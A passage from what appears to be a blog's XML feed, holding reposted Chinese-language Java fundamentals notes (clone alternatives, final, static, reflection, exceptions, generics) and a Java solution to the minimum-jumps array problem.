function">println</span><span class="token punctuation">(</span>e2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2</span></code></pre><p><strong>4. clone() 的替代方案</strong></p><p>使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CloneConstructorExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">CloneConstructorExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">CloneConstructorExample</span><span class="token punctuation">(</span>CloneConstructorExample original<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>original<span class="token punctuation">.</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> original<span class="token punctuation">.</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> original<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>CloneConstructorExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CloneConstructorExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CloneConstructorExample e2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CloneConstructorExample</span><span class="token punctuation">(</span>e1<span class="token punctuation">)</span><span class="token punctuation">;</span>e1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2</span></code></pre><h1 id="六、关键字"><a href="#六、关键字" class="headerlink" title="六、关键字"></a>六、关键字</h1><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p><strong>1. 数据</strong></p><p>声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。</p><ul><li>对于基本类型，final 使数值不变；</li><li>对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// x = 2;  // cannot assign value to final variable 'x'</span><span class="token keyword">final</span> A y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>y<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></code></pre><p><strong>2. 方法</strong></p><p>声明方法不能被子类重写。</p><p>private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。</p><p><strong>3. 类</strong></p><p>声明类不允许被继承。</p><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p><strong>1. 静态变量</strong></p><ul><li>静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。</li><li>实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 实例变量</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> y<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 静态变量</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// int x = A.x;  // Non-static field 'x' cannot be referenced from a static context</span>        A a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> a<span class="token punctuation">.</span>x<span class="token punctuation">;</span>        <span class="token keyword">int</span> y <span class="token operator">=</span> A<span class="token punctuation">.</span>y<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>2. 静态方法</strong></p><p>静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// public abstract static void func2();  // Illegal combination of modifiers: 'abstract' and 'static'</span><span class="token punctuation">}</span></code></pre><p>只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> y<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// int b = y;  // Non-static field 'y' cannot be referenced from a static context</span>        <span class="token comment" spellcheck="true">// int b = this.y;     // 'A.this' cannot be referenced from a static context</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>3. 静态语句块</strong></p><p>静态语句块在类初始化时运行一次。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        A a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        A a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">123</span></code></pre><p><strong>4. 静态内部类</strong></p><p>非静态内部类依赖于外部类的实例，而静态内部类不需要。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OuterClass</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">InnerClass</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">StaticInnerClass</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context</span>        OuterClass outerClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OuterClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InnerClass innerClass <span class="token operator">=</span> outerClass<span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">InnerClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StaticInnerClass staticInnerClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StaticInnerClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>静态内部类不能访问外部类的非静态的变量和方法。</p><p><strong>5. 静态导包</strong></p><p>在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>*</code></pre><p><strong>6. 初始化顺序</strong></p><p>静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String staticField <span class="token operator">=</span> <span class="token string">"静态变量"</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态语句块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> String field <span class="token operator">=</span> <span class="token string">"实例变量"</span><span class="token punctuation">;</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通语句块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后才是构造函数的初始化。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">InitialOrderTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在继承的情况下，初始化顺序为：</p><ul><li>父类（静态变量、静态语句块）</li><li>子类（静态变量、静态语句块）</li><li>父类（实例变量、普通语句块）</li><li>父类（构造函数）</li><li>子类（实例变量、普通语句块）</li><li>子类（构造函数）</li></ul><h1 id="七、反射"><a href="#七、反射" class="headerlink" title="七、反射"></a>七、反射</h1><p>每个类都有一个 <strong>Class</strong> 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。</p><p>类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 <code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;)</code> 这种方式来控制类的加载，该方法会返回一个 Class 对象。</p><p>反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。</p><p>Class 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类：</p><ul><li><strong>Field</strong> ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段；</li><li><strong>Method</strong> ：可以使用 invoke() 方法调用与 Method 对象关联的方法；</li><li><strong>Constructor</strong> ：可以用 Constructor 创建新的对象。</li></ul><p><strong>反射的优点：</strong></p><ul><li><strong>可扩展性</strong> ：应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。</li><li><strong>类浏览器和可视化开发环境</strong> ：一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。</li><li><strong>调试器和测试工具</strong> ： 调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。</li></ul><p><strong>反射的缺点：</strong></p><p>尽管反射非常强大，但也不能滥用。如果一个功能可以不用反射完成，那么最好就不用。在我们使用反射技术时，下面几条内容应该牢记于心。</p><ul><li><strong>性能开销</strong> ：反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。</li><li><strong>安全限制</strong> ：使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet，那么这就是个问题了。</li><li><p><strong>内部暴露</strong> ：由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。</p></li><li><p><a href="https://docs.oracle.com/javase/tutorial/reflect/index.html" target="_blank" rel="noopener">Trail: The Reflection API</a></p></li><li><a href="http://www.sczyh30.com/posts/Java/java-reflection-1/" target="_blank" rel="noopener">深入解析 Java 反射（1）- 基础</a></li></ul><h1 id="八、异常"><a href="#八、异常" class="headerlink" title="八、异常"></a>八、异常</h1><p>Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： <strong>Error</strong> 和 <strong>Exception</strong>。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种：</p><ul><li><strong>受检异常</strong> ：需要用 try…catch… 语句捕获并进行处理，并且可以从异常中恢复；</li><li><strong>非受检异常</strong> ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/PPjwP.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/PPjwP.png" alt="img"></a></p><ul><li><a href="https://www.tianmaying.com/tutorial/Java-Exception" target="_blank" rel="noopener">Java 入门之异常处理</a></li><li><a href="http://www.importnew.com/7383.html" target="_blank" rel="noopener">Java 异常的面试问题及答案 -Part 1</a></li></ul><h1 id="九、泛型"><a href="#九、泛型" class="headerlink" title="九、泛型"></a>九、泛型</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Box</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// T stands for "Type"</span>    <span class="token keyword">private</span> T t<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span>T t<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>t <span class="token operator">=</span> t<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> T <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> t<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><a href="http://www.importnew.com/24029.html" target="_blank" rel="noopener">Java 泛型详解</a></li><li><a href="https://cloud.tencent.com/developer/article/1033693" target="_blank" rel="noopener">10 道 Java 泛型面试题</a></li></ul><h1 id="十、注解"><a href="#十、注解" class="headerlink" title="十、注解"></a>十、注解</h1><p>Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。</p><p><a href="https://www.cnblogs.com/acm-bingzi/p/javaAnnotation.html" target="_blank" rel="noopener">注解 Annotation 实现原理与自定义注解例子</a></p><h1 id="十一、特性"><a href="#十一、特性" class="headerlink" title="十一、特性"></a>十一、特性</h1><h2 id="Java-各版本的新特性"><a href="#Java-各版本的新特性" class="headerlink" title="Java 各版本的新特性"></a>Java 各版本的新特性</h2><p><strong>New highlights in Java SE 8</strong></p><ol><li>Lambda Expressions</li><li>Pipelines and Streams</li><li>Date and Time API</li><li>Default Methods</li><li>Type Annotations</li><li>Nashhorn JavaScript Engine</li><li>Concurrent Accumulators</li><li>Parallel operations</li><li>PermGen Error Removed</li></ol><p><strong>New highlights in Java SE 7</strong></p><ol><li>Strings in Switch Statement</li><li>Type Inference for Generic Instance Creation</li><li>Multiple Exception Handling</li><li>Support for Dynamic Languages</li><li>Try with Resources</li><li>Java nio Package</li><li>Binary Literals, Underscore in literals</li><li>Diamond Syntax</li></ol><ul><li><a href="http://www.selfgrowth.com/articles/difference-between-java-18-and-java-17" target="_blank" rel="noopener">Difference between Java 1.8 and Java 1.7?</a></li><li><a href="http://www.importnew.com/19345.html" target="_blank" rel="noopener">Java 8 特性</a></li></ul><h2 id="Java-与-C-的区别"><a href="#Java-与-C-的区别" class="headerlink" title="Java 与 C++ 的区别"></a>Java 与 C++ 的区别</h2><ul><li>Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。</li><li>Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。</li><li>Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。</li><li>Java 支持自动垃圾回收，而 C++ 需要手动回收。</li><li>Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。</li><li>Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。</li><li>Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。</li><li>Java 不支持条件编译，C++ 通过 #ifdef #ifndef 等预处理命令从而实现条件编译。</li></ul><p><a href="http://cs-fundamentals.com/tech-interview/java/differences-between-java-and-cpp.php" target="_blank" rel="noopener">What are the main differences between Java and C++?</a></p><h2 id="JRE-or-JDK"><a href="#JRE-or-JDK" class="headerlink" title="JRE or JDK"></a>JRE or JDK</h2><ul><li>JRE is the JVM program, Java application need to run on JRE.</li><li>JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler “javac”</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Eckel B. Java 编程思想[M]. 机械工业出版社, 2002.</li><li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跳完数组的最少跳数</title>
      <link href="/2018/12/23/suan-fa/shu-zu/tiao-wan-shu-zu-de-zui-shao-tiao-shu/"/>
      <url>/2018/12/23/suan-fa/shu-zu/tiao-wan-shu-zu-de-zui-shao-tiao-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="跳完数组的最少跳数"><a href="#跳完数组的最少跳数" class="headerlink" title="跳完数组的最少跳数"></a>跳完数组的最少跳数</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>非负整数</strong>数组，数组中的每个数字表示那个位置上可以向后跳的<strong>最大</strong>步数。一开始你站在下标为 0 的位置，你要计算出<strong>最少</strong>需要跳几次才能到达数组最后位置。如果无法到达数组最后位置，则返回 -1。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的数组 a 是：2, 4, 0, 1, 2一开始站在下标为 0 的位置，最多能向后跳 2 步。你先跳 1 步，来到 4，再跳 3 步就到达最后的位置。需要的最少跳数是 2。再比如说，给你的数组是：2, 1, 0, 4一开始如果跳 2 步，到达 0，不能再跳。一开始如果跳 1 步，到达 1，可以向后再跳 1 步。但跳 1 步后仍然到达 0，不能再跳。因此对于这个数组，你没办法跳到最后的位置，返回 -1。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">numOfJumpToLast</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">>=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> d<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> max<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> i<span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> last <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> last<span class="token punctuation">;</span> j <span class="token operator">></span> i <span class="token operator">&amp;&amp;</span> d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span>        d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">numOfJumpToLastO1</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> jumps <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> curEnd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">>=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> jumps <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> max<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> curEnd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">++</span>jumps<span class="token punctuation">;</span>        curEnd <span class="token operator">=</span> max<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> i<span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不用+-求两数之和</title>
      <link href="/2018/12/16/suan-fa/wei-yun-suan/bu-yong-jia-jian-qiu-liang-shu-zhi-he/"/>
      <url>/2018/12/16/suan-fa/wei-yun-suan/bu-yong-jia-jian-qiu-liang-shu-zhi-he/</url>
      
